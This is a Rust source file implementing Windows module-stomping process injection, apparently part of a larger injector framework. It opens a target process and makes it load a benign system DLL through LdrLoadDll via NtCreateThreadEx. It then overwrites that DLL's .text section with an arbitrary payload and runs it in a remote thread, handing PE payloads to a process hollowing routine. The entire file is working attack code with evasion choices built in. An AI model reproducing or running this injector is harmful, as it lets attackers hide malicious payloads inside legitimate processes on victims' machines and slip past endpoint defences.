use anyhow::{anyhow, Result};
use crate::injection::Injector;

pub struct ModuleStompInjector;

#[cfg(windows)]
impl Injector for ModuleStompInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use winapi::um::handleapi::CloseHandle;
        use string_crypt::enc_str;
        
        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            log::info!("PE payload detected, forwarding to process hollowing's inject_into_process");
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e))
            };
        }

        unsafe {
            let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, 0, pid);
            if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }

            let candidates: Vec<&str> = vec![
                "msfte.dll",
                "msratelc.dll",
                "scrobj.dll",
                "amstream.dll",
            ];

            // Just picking the first one available for stomp
            let target_dll: &str = candidates[0];
            let mut target_dll_w: Vec<u16> = target_dll.encode_utf16().chain(std::iter::once(0)).collect();

            // Resolve LdrLoadDll dynamically
            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
            if ntdll.is_null() { return Err(anyhow!("ntdll missing")); }
            let ldr_load_dll = winapi::um::libloaderapi::GetProcAddress(ntdll, b"LdrLoadDll\0".as_ptr() as _);
            if ldr_load_dll.is_null() { return Err(anyhow!("LdrLoadDll missing")); }

            // Using NtCreateThreadEx instead of CreateRemoteThread
            let mut remote_str = VirtualAllocEx(h_proc, std::ptr::null_mut(), target_dll_w.len() * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if remote_str.is_null() { 
                CloseHandle(h_proc);
                return Err(anyhow!("VirtualAllocEx failed"));
            }
            
            let mut written = 0;
            if winapi::shared::minwindef::FALSE == WriteProcessMemory(h_proc, remote_str, target_dll_w.as_ptr() as _, target_dll_w.len() * 2, &mut written) {
                CloseHandle(h_proc);
                return Err(anyhow!("WriteProcessMemory failed"));
            }

            let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            
            // Emulating NtCreateThreadEx signature
            type NtCreateThreadExFn = unsafe extern "system" fn(
                ThreadHandle: *mut *mut winapi::ctypes::c_void,
                DesiredAccess: u32,
                ObjectAttributes: *mut winapi::ctypes::c_void,
                ProcessHandle: *mut winapi::ctypes::c_void,
                StartRoutine: *mut winapi::ctypes::c_void,
                Argument: *mut winapi::ctypes::c_void,
                CreateFlags: u32,
                ZeroBits: usize,
                StackSize: usize,
                MaximumStackSize: usize,
                AttributeList: *mut winapi::ctypes::c_void,
            ) -> i32;

            let build_thread: NtCreateThreadExFn = std::mem::transmute(winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtCreateThreadEx\0".as_ptr() as _));
            
            let status = build_thread(&mut h_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, ldr_load_dll as _, remote_str, 0, 0, 0, 0, std::ptr::null_mut());
            if status >= 0 && !h_thread.is_null() {
                winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
                CloseHandle(h_thread);
            }

            use winapi::um::psapi::{EnumProcessModules, GetModuleBaseNameW};
            let mut h_mods = [std::ptr::null_mut(); 1024];
            let mut cb_needed = 0;
            let mut target_base: *mut winapi::ctypes::c_void = std::ptr::null_mut();

            if EnumProcessModules(h_proc, h_mods.as_mut_ptr(), std::mem::size_of_val(&h_mods) as u32, &mut cb_needed) != 0 {
                let count = cb_needed as usize / std::mem::size_of::<winapi::shared::minwindef::HMODULE>();
                for i in 0..count {
                    let mut sz_mod_name = [0u16; 256];
                    if GetModuleBaseNameW(h_proc, h_mods[i], sz_mod_name.as_mut_ptr() as _, 256) > 0 {
                        let name_str = String::from_utf16_lossy(&sz_mod_name).to_lowercase();
                        if name_str.contains(&target_dll.to_lowercase()) {
                            target_base = h_mods[i] as _;
                            break;
                        }
                    }
                }
            }

            if target_base.is_null() {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find loaded target DLL for stomping"));
            }

            use winapi::um::memoryapi::ReadProcessMemory;
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
            use std::mem::size_of;

            let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
            let mut bytes_read = 0;
            if ReadProcessMemory(h_proc, target_base as _, &mut dos_header as *mut _ as _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read remote DOS header"));
            }

            if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                CloseHandle(h_proc);
                return Err(anyhow!("Invalid DOS signature"));
            }

            #[cfg(target_arch = "x86_64")]
            type NtHeaders = IMAGE_NT_HEADERS64;
            #[cfg(target_arch = "x86")]
            type NtHeaders = IMAGE_NT_HEADERS32;

            let mut nt_headers: NtHeaders = std::mem::zeroed();
            let nt_headers_addr = (target_base as usize + dos_header.e_lfanew as usize) as *mut _;
            if ReadProcessMemory(h_proc, nt_headers_addr, &mut nt_headers as *mut _ as _, size_of::<NtHeaders>(), &mut bytes_read) == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read remote NT headers"));
            }

            let mut text_rva = 0;
            let mut text_size = 0;

            let section_offset = (target_base as usize + dos_header.e_lfanew as usize + 
                std::mem::offset_of!(NtHeaders, OptionalHeader) + 
                nt_headers.FileHeader.SizeOfOptionalHeader as usize);

            let mut current_section_addr = section_offset as usize;

            for _ in 0..nt_headers.FileHeader.NumberOfSections {
                let mut section: IMAGE_SECTION_HEADER = std::mem::zeroed();
                if ReadProcessMemory(h_proc, current_section_addr as _, &mut section as *mut _ as _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read) == 0 {
                    break;
                }

                let name = String::from_utf8_lossy(&section.Name);
                if name.starts_with(".text") {
                    text_rva = section.VirtualAddress;
                    text_size = *section.Misc.VirtualSize();
                    break;
                }
                current_section_addr += size_of::<IMAGE_SECTION_HEADER>();
            }

            if text_rva == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find .text section"));
            }

            if payload.len() > text_size as usize {
                CloseHandle(h_proc);
                return Err(anyhow!("Payload larger than target .text section"));
            }

            let target_addr = (target_base as usize + text_rva as usize) as *mut winapi::ctypes::c_void;

            let mut old_protect = 0;
            if winapi::shared::minwindef::FALSE == VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_READWRITE, &mut old_protect) {
                CloseHandle(h_proc);
                return Err(anyhow!("VirtualProtectEx PAGE_READWRITE failed"));
            }

            if winapi::shared::minwindef::FALSE == WriteProcessMemory(h_proc, target_addr, payload.as_ptr() as _, payload.len(), &mut written) {
                CloseHandle(h_proc);
                return Err(anyhow!("WriteProcessMemory failed"));
            }

            if winapi::shared::minwindef::FALSE == VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READ, &mut old_protect) {
                CloseHandle(h_proc);
                return Err(anyhow!("VirtualProtectEx PAGE_EXECUTE_READ failed"));
            }

            let mut h_exec_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            let exec_status = build_thread(&mut h_exec_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, target_addr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            if exec_status >= 0 && !h_exec_thread.is_null() {
                CloseHandle(h_exec_thread);
            } else {
                CloseHandle(h_proc);
                return Err(anyhow!("NtCreateThreadEx execution failed"));
            }

            CloseHandle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ModuleStompInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Module Stomping only supported on Windows"))
    }
}
